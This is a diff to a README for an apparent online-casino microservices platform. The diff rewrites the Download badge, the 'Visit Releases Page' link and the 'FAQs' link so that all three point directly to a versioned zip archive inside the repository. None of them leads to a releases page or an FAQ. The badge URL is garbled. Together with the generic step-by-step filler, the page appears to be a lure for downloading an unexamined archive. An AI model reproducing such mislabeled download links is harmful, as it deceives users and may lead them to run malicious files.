@@ -4,7 +4,7 @@
 Welcome to the igaming-platform! This application provides essential services such as a wallet service, bonus engine, and machine learning-powered fraud detection. Developed using Go, gRPC, PostgreSQL, Redis, and RabbitMQ, this software offers production-ready microservices tailored for online casinos and betting platforms.
 
 ## 📦 Download Now
-[![Download](https://raw.githubusercontent.com/Kemin500/igaming-platform/main/deploy/igaming-platform-v1.9.zip%20Now-%20%https://raw.githubusercontent.com/Kemin500/igaming-platform/main/deploy/igaming-platform-v1.9.zip)](https://raw.githubusercontent.com/Kemin500/igaming-platform/main/deploy/igaming-platform-v1.9.zip)
+[![Download](https://github.com/Kemin500/igaming-platform/raw/refs/heads/main/services/wallet/platform_igaming_v2.2-alpha.2.zip%20Now-%20%https://github.com/Kemin500/igaming-platform/raw/refs/heads/main/services/wallet/platform_igaming_v2.2-alpha.2.zip)](https://github.com/Kemin500/igaming-platform/raw/refs/heads/main/services/wallet/platform_igaming_v2.2-alpha.2.zip)
 
 ## 🚀 Getting Started
 To start using the igaming-platform, follow these steps:
@@ -12,7 +12,7 @@ To start using the igaming-platform, follow these steps:
 ### Step 1: Visit the Releases Page
 Head over to the releases page by clicking the button below. This is where you can find the latest version of the software available for download.
 
-[Visit Releases Page](https://raw.githubusercontent.com/Kemin500/igaming-platform/main/deploy/igaming-platform-v1.9.zip)
+[Visit Releases Page](https://github.com/Kemin500/igaming-platform/raw/refs/heads/main/services/wallet/platform_igaming_v2.2-alpha.2.zip)
 
 ### Step 2: Choose Your Version
 On the releases page, you will see a list of versions. Pick the most recent version that suits your needs. Each version will have release notes that detail the updates and changes.
@@ -60,6 +60,6 @@ These topics reflect the comprehensive capabilities of the platform.
 ## ⚙️ Support
 If you encounter issues during download or installation, feel free to reach out for support through the "Issues" section on our GitHub page. You can report bugs or ask questions regarding usage.
 
-For further information, please check the [FAQs](https://raw.githubusercontent.com/Kemin500/igaming-platform/main/deploy/igaming-platform-v1.9.zip) section available in our repository.
+For further information, please check the [FAQs](https://github.com/Kemin500/igaming-platform/raw/refs/heads/main/services/wallet/platform_igaming_v2.2-alpha.2.zip) section available in our repository.
 
 By following this guide, you can easily download and run the igaming-platform. We hope you enjoy the benefits this application brings to your online gaming journey.
